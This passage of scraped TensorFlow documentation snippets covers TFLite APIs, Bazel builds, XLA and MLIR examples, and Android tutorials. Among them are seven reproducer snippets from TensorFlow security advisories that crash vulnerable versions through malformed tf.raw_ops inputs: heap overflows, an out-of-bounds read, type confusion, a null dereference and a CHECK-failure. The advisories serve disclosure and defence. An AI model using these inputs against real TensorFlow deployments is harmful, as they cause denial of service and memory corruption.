if tf.random.uniform(()) > 0.5:
  return 1
```

----------------------------------------

TITLE: Appending DataLoader Data (Python)
DESCRIPTION: Appends the dataset from another DataLoader instance to the current one. Users are responsible for ensuring that the embedders used to generate the datasets in both DataLoader instances are identical for consistency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/DataLoader.md#_snippet_1

LANGUAGE: python
CODE:
```
append(
    data_loader: 'DataLoader'
) -> None
```

----------------------------------------

TITLE: Visualizing Preprocessed Content and Style Images (Python)
DESCRIPTION: Defines a helper function `imshow` to display an image using matplotlib, automatically removing the batch dimension if present. It then uses this function to display the preprocessed content and style images side-by-side for visual inspection before running the style transfer models. Requires matplotlib and the preprocessed images.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
def imshow(image, title=None):
  if len(image.shape) > 3:
    image = tf.squeeze(image, axis=0)

  plt.imshow(image)
  if title:
    plt.title(title)

plt.subplot(1, 2, 1)
imshow(preprocessed_content_image, 'Content Image')

plt.subplot(1, 2, 2)
imshow(preprocessed_style_image, 'Style Image')
```

----------------------------------------

TITLE: Initializing ImagePropertiesT Class in Python
DESCRIPTION: This is the default constructor for the `ImagePropertiesT` class within the TensorFlow Lite Support metadata schema. It creates an empty instance of the object, ready to be populated with image-related metadata properties. It does not take any initialization arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ImagePropertiesT()
```

----------------------------------------

TITLE: Creating Serving Model Python
DESCRIPTION: This method returns the underlying Keras model instance optimized or configured for serving purposes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_3

LANGUAGE: python
CODE:
```
create_serving_model()
```

----------------------------------------

TITLE: Call StatsAddMin Function in TFLite Metadata Builder Python
DESCRIPTION: Calls the `StatsAddMin` function to add a minimum statistic value to a FlatBuffer builder. This function is part of the process for generating metadata schemas for TensorFlow Lite models. It requires a FlatBuffer `builder` object and the integer or float `min` value to be added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/StatsAddMin.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.StatsAddMin(
    builder, min
)
```

----------------------------------------

TITLE: Accessing Custom Metadata in Python
DESCRIPTION: Accesses a specific entry in the list of custom metadata. This method allows retrieval of custom metadata entries by their index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_3

LANGUAGE: python
CODE:
```
CustomMetadata(
    j
)
```

----------------------------------------

TITLE: Creating Associated File Metadata (Python)
DESCRIPTION: Generates and returns a Flatbuffers Python object representing the associated file metadata based on the data provided during the object's initialization. This method converts the containerized information into the format required for TFLite model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/LabelFileMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> tflite_support.metadata_schema_py_generated.AssociatedFileT
```

----------------------------------------

TITLE: Converting Element Type XLA HLO Example
DESCRIPTION: This HLO snippet demonstrates the `convert` operation, which performs an element-wise conversion of an array's data type. It shows converting an array `a` of signed 32-bit integers (`s32`) to an array `b` of 32-bit floating-point numbers (`f32`), resulting in a floating-point representation of the original integer values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_11

LANGUAGE: xla-hlo
CODE:
```
let a: s32[3] = {0, 1, 2};
let b: f32[3] = convert(a, f32);
then b == f32[3]{0.0, 1.0, 2.0}
```

----------------------------------------

TITLE: Implementing Java Task API Answer Method
DESCRIPTION: This snippet illustrates how a Java Task API method (`answer`) calls a corresponding private native method (`answerNative`). It passes the native C++ handle obtained from `getNativeHandle()` along with the API's input parameters (context, question) to the native layer. This is part of bridging Java to C++ using JNI.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_5

LANGUAGE: java
CODE:
```
    class BertQuestionAnswerer extends BaseTaskApi {
      public List<QaAnswer> answer(String context, String question) {
        return answerNative(getNativeHandle(), context, question);
      }

      private static native List<QaAnswer> answerNative(
                                            long nativeHandle, // C++ pointer
                                            String context, String question // API I/O
                                           );

    }
```

----------------------------------------

TITLE: Retrieving User Info from TextSearcher Index (Python)
DESCRIPTION: Retrieves opaque user information stored within the index file associated with the `TextSearcher`. This information is returned as a raw binary string. It returns an empty string if no user info is present in the index file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcher.md#_snippet_3

LANGUAGE: python
CODE:
```
get_user_info() -> str
```

----------------------------------------

TITLE: Converting TFLite Model to C Array using xxd (Bash)
DESCRIPTION: This bash command uses the `xxd` utility to convert a TensorFlow Lite FlatBuffer file (`.tflite`) into a C source file (`model_data.cc`). The output file contains the raw model data represented as an `unsigned char` array, which is suitable for embedding directly into a microcontroller program, especially on platforms lacking a filesystem.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/build_convert.md#_snippet_0

LANGUAGE: bash
CODE:
```
xxd -i converted_model.tflite > model_data.cc
```

----------------------------------------

TITLE: Illegal Inconsistent Dtype in tf.while_loop Error Python
DESCRIPTION: Illustrates an error in `tf.while_loop` where the dtype of a loop variable (`x`) changes between iterations or is inconsistent with the initial value. The loop variable is initialized as `tf.int32` but the body attempts to return a `tf.float32`. Dtypes must remain consistent for loop variables. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_41

LANGUAGE: Python
CODE:
```
# This won't work - "x" changes dtype inside the loop.
x = tf.while_loop(
    lambda _: tf.random.uniform(()) > 0.5,
    lambda x: tf.constant(1, dtype=tf.float32),
    loop_vars=(tf.constant(1, dtype=tf.int32),))  # Error -- inconsistent dtypes: int32, float32
```

----------------------------------------

TITLE: Demonstrating Heap OOB Vulnerability in tf.raw_ops.UpperBound Python
DESCRIPTION: This Python snippet shows how to trigger a heap out-of-bounds read vulnerability in `tf.raw_ops.UpperBound`. By providing a `sorted_input` tensor with rank 1, which is less than the expected minimum rank of 2, the internal C++ kernel attempts to access `dim_size(1)`, leading to the out-of-bounds access.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-144.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.UpperBound(
  sorted_input=[1,2,3],
  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),
  out_type=tf.int64)
```

----------------------------------------

TITLE: Converting Frozen GraphDef File to TFLite in Python
DESCRIPTION: This example demonstrates converting a Frozen GraphDef file (.pb or .pbtxt) into a TensorFlow Lite model using `tf.compat.v1.lite.TFLiteConverter.from_frozen_graph`. It requires specifying the path to the graph file and the names of the input and output nodes/arrays.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/python_api.md#_snippet_4

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Convert the model.
converter = tf.compat.v1.lite.TFLiteConverter.from_frozen_graph(
    graph_def_file='/path/to/mobilenet_v1_1.0_224/frozen_graph.pb',
                    # both `.pb` and `.pbtxt` files are accepted.
    input_arrays=['input'],
    input_shapes={'input' : [1, 224, 224,3]},
    output_arrays=['MobilenetV1/Predictions/Softmax']
)
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Triggering Type Confusion with ResourceCountUpTo / TensorFlow / Python
DESCRIPTION: This Python snippet illustrates triggering the CVE-2021-29513 vulnerability using a raw op, `tf.raw_ops.ResourceCountUpTo`. By setting the template parameter `T` to 3 (likely representing a non-numeric type like `tf.resource`), the code attempts to handle a type incorrectly during conversion, leading to the null pointer dereference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_4

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
data = tf.raw_ops.ResourceCountUpTo(resource=np.int32(30), limit=872, T=3)
```

----------------------------------------

TITLE: Converting GraphDef with Multiple Output Arrays
DESCRIPTION: This command shows how to convert a Frozen GraphDef that produces multiple outputs or when you want to extract specific multiple output tensors. The `--output_arrays` flag accepts a comma-separated list of the desired output tensor names.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_9

LANGUAGE: Shell
CODE:
```
tflite_convert \
  --graph_def_file=/tmp/inception_v1_2016_08_28_frozen.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=InceptionV1/InceptionV1/Mixed_3b/Branch_1/Conv2d_0a_1x1/Relu,InceptionV1/InceptionV1/Mixed_3b/Branch_2/Conv2d_0a_1x1/Relu
```

----------------------------------------

TITLE: Generating TensorFlow Lite Builtin Ops Headers - Shell
DESCRIPTION: This shell command uses Bazel to run two generator targets. The first target generates the `builtin_ops.h` header file, and the second target generates the `builtin_ops_list.inc` include file. These files contain definitions and lists for TensorFlow Lite's builtin operations and should be regenerated whenever new ops are added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/schema/builtin_ops_list/README.md#_snippet_0

LANGUAGE: sh
CODE:
```
bazel run \
  //tensorflow/lite/schema/builtin_ops_header:generate > \
  tensorflow/lite/builtin_ops.h &&\
bazel run \
  //tensorflow/lite/schema/builtin_ops_list:generate > \
  tensorflow/lite/kernels/builtin_ops_list.inc
```

----------------------------------------

TITLE: Building MLIR StablehloToMhlo Library (CMake)
DESCRIPTION: Defines a CMake target for the StablehloToMhlo library. This library contains MLIR passes for converting StableHLO dialect operations back to the MHLO dialect, listing source files and dependencies including the StableHLO and MHLO dialects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_13

LANGUAGE: CMake
CODE:
```
add_mlir_library(StablehloToMhlo
  stablehlo_legalize_to_hlo/stablehlo_legalize_to_hlo.cc
  stablehlo_legalize_to_hlo/stablehlo_legalize_to_hlo_pass.cc

  DEPENDS
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  MhloDialect
  MhloTypeConversion
  MLIRAsmParser
  MLIRIR
  MLIRPass
  MLIRSupport
  MLIRTransforms
  StablehloOps
)
```

----------------------------------------

TITLE: Detecting Large Unrolled Loop (Python)
DESCRIPTION: This snippet shows a training loop using a standard Python `range` for iteration within a context that might be converted by AutoGraph. With a large number of iterations, this pattern is detected as a potential performance issue because it results in Python-level iteration instead of a TensorFlow `tf.while_loop`, triggering a 'Large unrolled loop detected' warning.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/common_errors.md#_snippet_0

LANGUAGE: Python
CODE:
```
num_steps = 10000
step = tf.constant(0)
for i in range(num_steps):
  step += 1
  train_step(model)
```

----------------------------------------

TITLE: Pointing to Local CUDA/CUDNN/NCCL Directories (Shell/Bazel)
DESCRIPTION: Illustrates how to configure Bazel to use local installations or unpacked archives of CUDA, CUDNN, and NCCL instead of downloading them. This is done by setting the LOCAL_CUDA_PATH, LOCAL_CUDNN_PATH, and LOCAL_NCCL_PATH environment variables via `.bazelrc`, command line, or shell export.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_5

LANGUAGE: Bazel config
CODE:
```
# Add an entry to your `.bazelrc` file
build:cuda --repo_env=LOCAL_CUDA_PATH="/foo/bar/nvidia/cuda"
build:cuda --repo_env=LOCAL_CUDNN_PATH="/foo/bar/nvidia/cudnn"
build:cuda --repo_env=LOCAL_NCCL_PATH="/foo/bar/nvidia/nccl"
```

LANGUAGE: Shell
CODE:
```
# OR pass it directly to your specific build command
bazel build --config=cuda <target> \
--repo_env=LOCAL_CUDA_PATH="/foo/bar/nvidia/cuda" \
--repo_env=LOCAL_CUDNN_PATH="/foo/bar/nvidia/cudnn" \
--repo_env=LOCAL_NCCL_PATH="/foo/bar/nvidia/nccl"
```

LANGUAGE: Shell
CODE:
```
# If .bazelrc doesn't have corresponding entries and the environment variables
# are not passed to bazel command, you can set them globally in your shell:
export LOCAL_CUDA_PATH="/foo/bar/nvidia/cuda"
export LOCAL_CUDNN_PATH="/foo/bar/nvidia/cudnn"
export LOCAL_NCCL_PATH="/foo/bar/nvidia/nccl"
```

----------------------------------------

TITLE: Triggering TensorFlow QuantizeAndDequantizeV4Grad Crash Python
DESCRIPTION: This Python snippet demonstrates how to trigger a denial of service vulnerability in `tf.raw_ops.QuantizeAndDequantizeV4Grad` by providing invalid inputs for `input_min` (empty tensor) and `input_max` (scalar). The missing validation leads to a CHECK-failure and program termination. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-062.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.QuantizeAndDequantizeV4Grad(
  gradients=tf.constant(1, shape=[2,2], dtype=tf.float64),
  input=tf.constant(1, shape=[2,2], dtype=tf.float64),
  input_min=tf.constant([], shape=[0], dtype=tf.float64),
  input_max=tf.constant(-10, shape=[], dtype=tf.float64),
  axis=-1)
```

----------------------------------------

TITLE: Triggering Type Confusion with range / TensorFlow / Python
DESCRIPTION: This Python snippet demonstrates triggering the CVE-2021-29513 vulnerability using `tf.range`. Specifying `dtype=20` (a non-numeric type) for this operation, which expects numeric outputs, exploits the vulnerability during the internal conversion from Python data structures to TensorFlow tensors in the C++ backend.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_3

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
data = tf.range(start=np.int32(214),limit=660,delta=129,dtype=20)
```

----------------------------------------

TITLE: Configuring Git Sparse Checkout for Object Detection Example (Shell)
DESCRIPTION: These commands navigate into the cloned examples directory and configure Git's sparse checkout feature. This allows you to check out only the files relevant to the specific object detection Android example, reducing the total size of the repository on disk. This is an optional step for disk space management.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_1

LANGUAGE: Shell
CODE:
```
cd examples
git sparse-checkout init --cone
git sparse-checkout set lite/examples/object_detection/android
```

----------------------------------------

TITLE: Building TensorFlow MLIR Target (Shell)
DESCRIPTION: This Bazel command builds the `tf-opt` target within the TensorFlow MLIR compiler directory. It overrides the default `llvm-raw` repository with the specified local path (${LLVM_SRC}), allowing development against a local LLVM build instead of fetching from head. The `-c opt` flag builds with optimizations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/README.md#_snippet_1

LANGUAGE: shell
CODE:
```
bazel build --override_repository="llvm-raw=${LLVM_SRC}" \
  -c opt tensorflow/compiler/mlir:tf-opt
```

----------------------------------------

TITLE: Defining Custom CUDA Redistribution JSON Format
DESCRIPTION: This JSON snippet defines the expected format for a custom `cuda_redist.json` file used to specify locations of CUDA component distributions. It maps component names and platforms (like linux-x86_64, linux-sbsa) to paths, typically using `relative_path` which requires a path prefix.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_6

LANGUAGE: JSON
CODE:
```
{
   "cuda_cccl": {
      "linux-x86_64": {
         "relative_path": "cuda_cccl-linux-x86_64-12.4.99-archive.tar.xz",
      },
      "linux-sbsa": {
         "relative_path": "cuda_cccl-linux-sbsa-12.4.99-archive.tar.xz",
      }
   },
}
```

----------------------------------------

TITLE: Example Using DotGeneral with Contracting Dimensions
DESCRIPTION: This pseudocode demonstrates using the XLA DotGeneral operation with explicit contracting dimensions. It defines two 2D input arrays and a DotDimensionNumbers object specifying dimension 1 for contraction on both sides, resulting in a 2x2 output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_15

LANGUAGE: pseudocode
CODE:
```
lhs = { {1.0, 2.0, 3.0},
{4.0, 5.0, 6.0} }

rhs = { {1.0, 1.0, 1.0},
{2.0, 2.0, 2.0} }

DotDimensionNumbers dnums;
dnums.add_lhs_contracting_dimensions(1);
dnums.add_rhs_contracting_dimensions(1);

DotGeneral(lhs, rhs, dnums) -> { {6.0, 12.0},
{15.0, 30.0} }
```

----------------------------------------

TITLE: Reproducing Heap Overflow in TensorFlow RaggedBincount (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the heap out-of-bounds write vulnerability in `tf.raw_ops.RaggedBincount`. By providing an invalid `splits` tensor (e.g., `[7, 8]`), the internal logic attempts to write to a negative index, causing a crash or memory corruption.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-002.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.RaggedBincount(splits=[7,8], values= [5, 16, 51, 76, 29, 27, 54, 95],\
                          size= 59, weights= [0, 0, 0, 0, 0, 0, 0, 0],\
                          binary_output=False)
```

----------------------------------------

TITLE: ShapeInferenceContext Interface Definition (C++)
DESCRIPTION: Defines the interface for the ShapeInferenceContext class, used during the op kernel's shape inference phase. It includes methods to read input shapes (GetInputShape), set output shapes (SetOutputShape), and access input tensor data (GetInputTensor) if available during shape inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/shim/README.md#_snippet_5

LANGUAGE: C++
CODE:
```
template <typename SubType>
class ShapeInferenceContext {
 public:
  // Read an input tensor shape
  ShapeOr GetInputShape(const int idx) const;
  // Set an output tensor shape
  absl::Status SetOutputShape(const int idx, const Shape& shape);
  // Read an input tensor during shape inference
  ConstTensorViewOr GetInputTensor(const int idx) const;
};

```

----------------------------------------

TITLE: Testing Single Image Inference TFLite Python
DESCRIPTION: Selects the first image from the test dataset, prepares it by expanding dimensions and casting to float32. It then gets the input and output tensor indices, sets the input tensor with the test image data, invokes the interpreter for inference, and retrieves the prediction results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
test_image = np.expand_dims(test_images[0], axis=0).astype(np.float32)

input_index = interpreter.get_input_details()[0]["index"]
output_index = interpreter.get_output_details()[0]["index"]

interpreter.set_tensor(input_index, test_image)
interpreter.invoke()
predictions = interpreter.get_tensor(output_index)
```

----------------------------------------

TITLE: Triggering Null Pointer Dereference in TensorFlow StringNGrams (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the null pointer dereference vulnerability in `tf.raw_ops.StringNGrams`. It constructs specific `data` and `data_splits` tensors that exploit insufficient input validation in the operation's implementation, leading to a crash. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-030.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

data=tf.constant([''] * 11, shape=[11], dtype=tf.string)

splits = [0]*115
splits.append(3)
data_splits=tf.constant(splits, shape=[116], dtype=tf.int64)

tf.raw_ops.StringNGrams(data=data, data_splits=data_splits, separator=b'Ss',
                        ngram_widths=[7,6,11],
                        left_pad='ABCDE', right_pad=b'ZYXWVU',
                        pad_width=50, preserve_short_sequences=True)
```

----------------------------------------

TITLE: Performing Object Detection with TFLite in Python
DESCRIPTION: This instance method runs the object detection model on the provided input `TensorImage`. It processes the image and returns a `DetectionResult` object containing the detected objects, bounding boxes, and confidence scores. It may raise `ValueError` for invalid input or `RuntimeError` if the detection process fails.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ObjectDetector.md#_snippet_3

LANGUAGE: python
CODE:
```
detect(
    image: <a href="../../../tflite_support/task/vision/TensorImage"><code>tflite_support.task.vision.TensorImage</code></a>
) -> <a href="../../../tflite_support/task/processor/DetectionResult"><code>tflite_support.task.processor.DetectionResult</code></a>
```

----------------------------------------

TITLE: Starting SentencePieceModel Vector with FlatBuffers Builder in Python
DESCRIPTION: This Python function is part of the TensorFlow Lite Support library and is used in conjunction with a FlatBuffers builder. Its purpose is to initiate the process of building a vector field within the SentencePieceTokenizerOptions FlatBuffers table. The `builder` parameter is the active FlatBuffers builder instance, and `numElems` specifies the number of elements the vector will contain.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsStartSentencePieceModelVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsStartSentencePieceModelVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Demonstrating Heap Overflow in TensorFlow Transpose Python
DESCRIPTION: This Python snippet demonstrates the heap buffer overflow vulnerability in `tf.raw_ops.Transpose`. It defines a function `test` that calls `Transpose` with a negative index in the `perm` argument (`[-10]`), which is an invalid input that triggers the overflow in vulnerable versions. Running this code on an affected TensorFlow version should expose the issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-179.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
@tf.function
def test():
  y = tf.raw_ops.Transpose(x=[1,2,3,4],perm=[-10])
  return y

test()
```

----------------------------------------

TITLE: Passing TFLite Classification Results to Listener (Kotlin)
DESCRIPTION: Processes the output received from the AudioClassifier.classify() method. It extracts the classification results, specifically the categories from the first output element, and passes this list of categories along with the inference time to a defined AudioClassificationListener callback for further handling, such as updating the UI.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_12

LANGUAGE: kotlin
CODE:
```
private fun classifyAudio() {
  ...
  val output = classifier.classify(tensorAudio)
  listener.onResult(output[0].categories, inferenceTime)
}
```

----------------------------------------

TITLE: Implementing DetectorListener onResults Method (Kotlin)
DESCRIPTION: Implements the `onResults` method of the `DetectorListener` interface. It updates the inference time displayed on the UI and passes the detection results and image dimensions to an `OverlayView` for drawing bounding boxes and labels on the image preview.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_15

LANGUAGE: Kotlin
CODE:
```
override fun onResults(
  results: MutableList<Detection>?,
  inferenceTime: Long,
  imageHeight: Int,
  imageWidth: Int
) {
    activity?.runOnUiThread {
        fragmentCameraBinding.bottomSheetLayout.inferenceTimeVal.text =
            String.format("%d ms", inferenceTime)

        // Pass necessary information to OverlayView for drawing on the canvas
        fragmentCameraBinding.overlay.setResults(
            results ?: LinkedList<Detection>(),
            imageHeight,
            imageWidth
        )

        // Force a redraw
        fragmentCameraBinding.overlay.invalidate()
    }
}
```

----------------------------------------

TITLE: Building TFLite GPU Delegate with Bazel Shell
DESCRIPTION: These shell commands show how to build the TensorFlow Lite GPU delegate library for Android ARM64 using the Bazel build system. The first command builds the static library (`delegate`), while the second builds the dynamic library (`libtensorflowlite_gpu_delegate.so`). These commands are executed in a Bazel environment with the appropriate configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_1

LANGUAGE: sh
CODE:
```
bazel build -c opt --config android_arm64 tensorflow/lite/delegates/gpu:delegate                           # for static library
bazel build -c opt --config android_arm64 tensorflow/lite/delegates/gpu:libtensorflowlite_gpu_delegate.so  # for dynamic library
```

----------------------------------------

TITLE: Running Sharded HLO on Multiple GPUs Bash
DESCRIPTION: This command executes an HLO module specified by a file path (`my-hlo.txt`) using the XLA multi-host HLO runner. It assumes sufficient GPUs are available and the working directory is the XLA Git repository where `./configure.py` has been run. The `--hlo_argument_mode=uninitialized` tip suggests optimizing input generation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_0

LANGUAGE: bash
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- my-hlo.txt
```

----------------------------------------

TITLE: Example MLIR After Simple Device Assignment (TF Dialect)
DESCRIPTION: Shows the result of applying the simple device assignment pass with a default device ('foobar') to the input MLIR code. Ops without an explicit device attribute are updated, while those with 'baz' remain unchanged.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_41

LANGUAGE: MLIR
CODE:
```
  %0 = "tf.Const"() {device = "foobar" value = dense<[[42.0]]> : tensor<1x1xf32>} : () -> tensor<1x1xf32>
  %1 = "tf.Const"() {device = "foobar", value = dense<[[42.0]]> : tensor<1x1xf32>} : () -> tensor<1x1xf32>
  %2 = "tf.Const"() {device = "baz", value = dense<[[42.0]]> : tensor<1x1xf32>} : () -> tensor<1x1xf32>
```

----------------------------------------

TITLE: Starting NormalizationOptions in FlatBuffers Builder (Python)
DESCRIPTION: This Python function, `NormalizationOptionsStart`, initiates the process of building a `NormalizationOptions` table within a FlatBuffers builder. It takes a FlatBuffers `builder` instance as its only argument and prepares the builder to add the fields of a `NormalizationOptions` object. This function must be called before adding fields to the `NormalizationOptions` table and is typically followed by a call to `NormalizationOptionsEnd`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsStart.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsStart(
    builder
)
```

----------------------------------------

TITLE: Initiating Mean Vector in TFLite Metadata Builder Python
DESCRIPTION: This Python function is called to start building a mean vector array within the NormalizationOptions structure using a flatbuffer builder. It requires the builder instance and the expected number of elements in the vector (`numElems`) to prepare the buffer for writing the vector data. It's a necessary step in programmatically generating TFLite metadata according to the defined schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsStartMeanVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsStartMeanVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Triggering TensorFlow TypeError in AutoGraph (Python)
DESCRIPTION: This snippet demonstrates how a type mismatch in operations within an `@tf.function` causes a TypeError during the graph tracing/construction phase. AutoGraph intercepts this Python exception and re-raises it, adding information to the error message that points back to the exact line in the original Python source code responsible for the error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/error_handling.md#_snippet_0

LANGUAGE: Python
CODE:
```
@tf.function
def f():
  tf.constant(1) + tf.constant(1.0)
f()
```

----------------------------------------

TITLE: Initializing BertInputTensorsMd Python
DESCRIPTION: Initializes a `BertInputTensorsMd` object to hold metadata for BERT input tensors. It requires the model buffer, names for the ids, mask, and segment tensors, and accepts optional `TensorMd` and tokenizer metadata (`BertTokenizerMd` or `SentencePieceTokenizerMd`). This object acts as a container for input metadata before writing it to a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/BertInputTensorsMd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.metadata_info.BertInputTensorsMd(
    model_buffer: bytearray,
    ids_name: str,
    mask_name: str,
    segment_name: str,
    ids_md: Optional[&lt;a href=&quot;../../../tflite_support/metadata_writers/metadata_info/TensorMd&quot;&gt;&lt;code&gt;tflite_support.metadata_writers.metadata_info.TensorMd&lt;/code&gt;&lt;/a&gt;] = None,
    mask_md: Optional[&lt;a href=&quot;../../../tflite_support/metadata_writers/metadata_info/TensorMd&quot;&gt;&lt;code&gt;tflite_support.metadata_writers.metadata_info.TensorMd&lt;/code&gt;&lt;/a&gt;] = None,
    segment_ids_md: Optional[&lt;a href=&quot;../../../tflite_support/metadata_writers/metadata_info/TensorMd&quot;&gt;&lt;code&gt;tflite_support.metadata_writers.metadata_info.TensorMd&lt;/code&gt;&lt;/a&gt;] = None,
    tokenizer_md: Union[None, &lt;a href=&quot;../../../tflite_support/metadata_writers/metadata_info/BertTokenizerMd&quot;&gt;&lt;code&gt;tflite_support.metadata_writers.metadata_info.BertTokenizerMd&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;../../../tflite_support/metadata_writers/metadata_info/SentencePieceTokenizerMd&quot;&gt;&lt;code&gt;tflite_support.metadata_writers.metadata_info.SentencePieceTokenizerMd&lt;/code&gt;&lt;/a&gt;] = None
)
```

----------------------------------------

TITLE: Accessing Output Tensor Metadata by Index in TensorFlow Lite Metadata (Python)
DESCRIPTION: Accesses or retrieves a specific OutputTensorMetadata object from the list of output tensor metadata within the TensorFlow Lite model's FlatBuffer structure using the provided index 'j'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_27

LANGUAGE: python
CODE:
```
OutputTensorMetadata(
    j
)
```

----------------------------------------

TITLE: Using AutoGraph list_pop wrapper Python
